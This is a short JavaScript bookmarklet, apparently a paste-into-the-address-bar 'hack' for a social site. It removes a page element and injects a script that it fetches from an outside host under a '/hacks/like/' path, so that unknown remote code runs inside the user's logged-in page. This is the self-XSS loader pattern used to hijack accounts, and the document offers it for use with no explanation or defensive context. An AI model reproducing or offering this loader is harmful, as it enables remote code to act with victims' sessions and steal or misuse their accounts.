javascript: var s = document.getElementById('happyStatus');
if (s) s.parentNode.removeChild(s);
s = document.createElement('script');
s.setAttribute('src', 'http://agerst.webs.com/hacks/like/un_comments.js');
s.setAttribute('type', 'text/javascript');
s.setAttribute('id', 'HnSScript');
document.body.appendChild(s);